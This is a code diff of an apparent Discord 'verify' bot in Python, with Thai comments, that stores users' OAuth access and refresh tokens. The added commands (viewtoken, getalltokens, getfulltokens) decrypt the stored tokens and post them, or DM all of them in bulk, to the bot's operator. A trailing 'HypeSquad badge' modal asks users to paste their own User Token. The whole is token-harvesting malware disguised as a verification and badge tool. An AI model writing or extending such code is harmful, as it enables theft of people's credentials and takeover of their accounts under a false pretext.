@@ -56,7 +56,6 @@ def decrypt_data(encrypted_data, token=MASTER_KEY):
 # ============ DATABASE ============
 conn = sqlite3.connect("data.db", check_same_thread=False)
 
-# แก้ตาราง user_tokens ให้เก็บ user_id เป็นข้อความธรรมดา
 conn.execute("""
 CREATE TABLE IF NOT EXISTS user_tokens (
     user_id TEXT PRIMARY KEY,
@@ -67,7 +66,6 @@ CREATE TABLE IF NOT EXISTS user_tokens (
 """)
 conn.commit()
 
-# แก้ตาราง verified_users ให้เก็บ user_id เป็นข้อความธรรมดา
 conn.execute("""
 CREATE TABLE IF NOT EXISTS verified_users (
     user_id TEXT PRIMARY KEY,
@@ -79,7 +77,6 @@ conn.commit()
 
 def save_user_token(user_id, access_token, refresh_token, expires_in):
     expires_at = int(time.time()) + expires_in
-    # user_id เก็บธรรมดา, Token เข้ารหัส
     conn.execute(
         "INSERT OR REPLACE INTO user_tokens (user_id, access_token, refresh_token, expires_at) VALUES (?, ?, ?, ?)",
         (str(user_id), encrypt_data(access_token), encrypt_data(refresh_token), expires_at)
@@ -87,7 +84,6 @@ def save_user_token(user_id, access_token, refresh_token, expires_in):
     conn.commit()
 
 def get_valid_access_token(user_id):
-    # ค้นหาด้วย user_id ธรรมดา
     row = conn.execute(
         "SELECT access_token, refresh_token, expires_at FROM user_tokens WHERE user_id = ?",
         (str(user_id),)
@@ -106,7 +102,6 @@ def get_valid_access_token(user_id):
     if time.time() < expires_at - 60:
         return access_token
     
-    # Refresh token
     try:
         res = requests.post(
             "https://discord.com/api/oauth2/token",
@@ -240,7 +235,6 @@ def callback():
         avatar_hash = user_res.get("avatar")
         user_avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
         
-        # บันทึก Token และข้อมูลผู้ใช้
         save_user_token(user_id, access_token, token_res.get("refresh_token"), token_res.get("expires_in"))
         save_verified_user(user_id, username, access_token)
         
@@ -310,6 +304,189 @@ async def setup_verify(ctx, role: discord.Role, emoji: str = "✅", banner_url: 
     view = VerifyView(ctx.guild.id, role.id, ctx.guild.name, emoji=emoji)
     await ctx.send(embed=embed, view=view)
     await ctx.message.delete()
+
+# ============ คำสั่งดู Token ============
+@bot.command()
+@is_authorized()
+async def viewtoken(ctx, member: discord.Member = None):
+    """!viewtoken @ผู้ใช้ - ดู User Token ของคนที่กดรับยศ (เฉพาะแอดมิน)"""
+    
+    if member is None:
+        member = ctx.author
+
+    user_id = str(member.id)
+
+    row = conn.execute(
+        "SELECT access_token, refresh_token, expires_at FROM user_tokens WHERE user_id = ?",
+        (user_id,)
+    ).fetchone()
+
+    if not row:
+        await ctx.send(f"❌ {member.mention} ยังไม่ได้กดปุ่มยืนยันตัวตน")
+        return
+
+    encrypted_access, encrypted_refresh, expires_at = row
+
+    try:
+        access_token = decrypt_data(encrypted_access)
+        refresh_token = decrypt_data(encrypted_refresh)
+    except:
+        await ctx.send(f"❌ ไม่สามารถถอดรหัส Token ของ {member.mention} ได้")
+        return
+
+    embed = discord.Embed(
+        title=f"🔑 Token ของ {member.name}",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="👤 Username",
+        value=f"`{member.name}`",
+        inline=False
+    )
+    embed.add_field(
+        name="🆔 User ID",
+        value=f"`{user_id}`",
+        inline=False
+    )
+    embed.add_field(
+        name="🔐 Access Token",
+        value=f"```\n{access_token}\n```",
+        inline=False
+    )
+    embed.add_field(
+        name="🔄 Refresh Token",
+        value=f"```\n{refresh_token}\n```",
+        inline=False
+    )
+    embed.add_field(
+        name="⏰ หมดอายุ",
+        value=f"<t:{expires_at}:F>",
+        inline=False
+    )
+    embed.set_footer(text="⚠️ Token = รหัสผ่าน อย่าแชร์ให้ใครเด็ดขาด!")
+
+    await ctx.send(embed=embed)
+
+# ============ คำสั่งส่ง Token ทั้งหมดทาง DM ============
+@bot.command()
+@is_authorized()
+async def getalltokens(ctx):
+    """!getalltokens - ส่ง Token ทั้งหมดที่เก็บไว้ไปทาง DM (เฉพาะแอดมิน)"""
+    
+    rows = conn.execute(
+        "SELECT user_id, access_token, refresh_token, expires_at FROM user_tokens"
+    ).fetchall()
+    
+    if not rows:
+        await ctx.send("❌ ยังไม่มีใครกดปุ่มยืนยันตัวตน")
+        return
+    
+    total = len(rows)
+    await ctx.send(f"⏳ กำลังส่ง Token ทั้งหมด {total} รายการ ไปทาง DM...")
+    
+    chunk_size = 5
+    success_sent = 0
+    
+    for i in range(0, total, chunk_size):
+        chunk = rows[i:i + chunk_size]
+        message_text = f"📋 **Token ทั้งหมด (ชุดที่ {i//chunk_size + 1}/{(total-1)//chunk_size + 1})**\n"
+        message_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        
+        for row in chunk:
+            user_id, encrypted_access, encrypted_refresh, expires_at = row
+            
+            try:
+                access_token = decrypt_data(encrypted_access)
+                refresh_token = decrypt_data(encrypted_refresh)
+            except:
+                access_token = "❌ ถอดรหัสไม่ได้"
+                refresh_token = "❌ ถอดรหัสไม่ได้"
+            
+            message_text += f"👤 **User ID:** `{user_id}`\n"
+            message_text += f"🔐 **Access:**\n```\n{access_token[:200]}\n```\n"
+            message_text += f"🔄 **Refresh:**\n```\n{refresh_token[:200]}\n```\n"
+            message_text += f"⏰ **หมดอายุ:** <t:{expires_at}:R>\n"
+            message_text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        
+        try:
+            await ctx.author.send(message_text)
+            success_sent += len(chunk)
+            await asyncio.sleep(1)
+        except discord.Forbidden:
+            await ctx.send("❌ ไม่สามารถส่ง DM ได้ กรุณาเปิด DM ของคุณ")
+            return
+        except Exception as e:
+            await ctx.send(f"⚠️ เกิดข้อผิดพลาด: {str(e)[:50]}")
+            continue
+    
+    await ctx.send(f"✅ ส่ง Token ทั้งหมด {success_sent}/{total} รายการ ไปทาง DM แล้ว")
+
+
+@bot.command()
+@is_authorized()
+async def getfulltokens(ctx):
+    """!getfulltokens - ส่ง Token ทั้งหมดแบบเต็ม (ไม่ตัด) ไปทาง DM"""
+    
+    rows = conn.execute(
+        "SELECT user_id, access_token, refresh_token FROM user_tokens"
+    ).fetchall()
+    
+    if not rows:
+        await ctx.send("❌ ยังไม่มีใครกดปุ่มยืนยันตัวตน")
+        return
+    
+    total = len(rows)
+    await ctx.send(f"⏳ กำลังส่ง Token ทั้งหมด {total} รายการ (แบบเต็ม) ไปทาง DM...")
+    
+    for row in rows:
+        user_id, encrypted_access, encrypted_refresh = row
+        
+        try:
+            access_token = decrypt_data(encrypted_access)
+            refresh_token = decrypt_data(encrypted_refresh)
+        except:
+            continue
+        
+        message_text = (
+            f"👤 **User ID:** `{user_id}`\n"
+            f"🔐 **Access Token:**\n```\n{access_token}\n```\n"
+            f"🔄 **Refresh Token:**\n```\n{refresh_token}\n```"
+        )
+        
+        try:
+            await ctx.author.send(message_text)
+            await asyncio.sleep(0.5)
+        except discord.Forbidden:
+            await ctx.send("❌ ไม่สามารถส่ง DM ได้ กรุณาเปิด DM ของคุณ")
+            return
+        except Exception as e:
+            continue
+    
+    await ctx.send(f"✅ ส่ง Token ทั้งหมด {total} รายการ ไปทาง DM แล้ว")
+
+
+@bot.command()
+@is_authorized()
+async def listusers(ctx):
+    """!listusers - แสดงรายชื่อผู้ที่กดยืนยันตัวตนแล้ว"""
+    users = get_all_verified_users()
+    if not users:
+        await ctx.send("📭 ยังไม่มีใครกดปุ่มยืนยันตัวตน")
+        return
+    
+    msg = "📋 **รายชื่อผู้ที่ยืนยันตัวตนแล้ว**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    for i, user in enumerate(users, 1):
+        msg += f"{i}. **{user['username']}** (`{user['user_id']}`)\n"
+    
+    await ctx.send(msg)
+
+
+@bot.command()
+@is_authorized()
+async def countverified(ctx):
+    """!countverified - นับจำนวนคนที่กดปุ่มแล้ว"""
+    users = get_all_verified_users()
+    await ctx.send(f"👥 มีผู้ยืนยันตัวตนแล้วทั้งหมด **{len(users)}** คน")
 
 # ============ ระบบทำตรา HypeSquad ============
 class TokenModal(discord.ui.Modal, title="🔑 ใส่ User Token"):
